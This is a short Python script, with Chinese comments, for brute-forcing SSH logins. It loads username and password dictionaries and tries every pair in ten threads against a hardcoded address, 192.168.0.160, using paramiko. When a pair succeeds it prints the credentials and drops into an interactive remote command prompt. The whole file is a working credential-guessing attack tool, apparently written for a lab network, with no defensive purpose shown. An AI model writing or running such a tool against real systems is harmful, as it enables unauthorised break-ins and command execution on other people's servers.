#多线程ssh字典暴力破解
import paramiko
import sys
import threading
__stderr__ = sys.stderr  #将当前默认的错误输出结果保存为__stderr__

ip='192.168.0.160'
m=1
n=0
def ssh(se,ip,username,password):
    try:
        global m,n
        se.acquire()  #获得信号量，信号量减一
        client=paramiko.SSHClient() #实例化SSHClient，SSHClient用于执行远程命令
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #默认远程连接，保存服务器主机名和密钥，自动添加策略
        client.connect(hostname=ip,port=22,username=str(username),password=str(password),timeout=10)
        print("\n成功！！！\nusername:",username,"\npassword:",password)
        while 1:
            print()
            cmd=input("shell>")
            stdin,stdout,stderr=client.exec_command(cmd) #stdin为输入，stdout为正确输出，stderr为错误输出，同时只有一个变量有值。
            print(stdout.read().decode('utf-8'))
        return
    except BaseException:
        se.release() #释放信号量，信号量加一
        print("shibai")
def duo(ip):
    f=open("../dictionary/user.txt", "r").readlines()
    g=open("../dictionary/pass1.txt", "r").readlines()
    global m,n
    semaphore=threading.Semaphore(10)
    for i in f:
        username=i.strip()
        for j in g:
            password=j.strip()
            n=n+1
            print("\r"+"字典进度为：",n,"waiting....",end="",flush=True)
            t=threading.Thread(target=ssh,args=(semaphore,ip,username,password))
            t.start()
if __name__=='__main__':
    duo(ip)
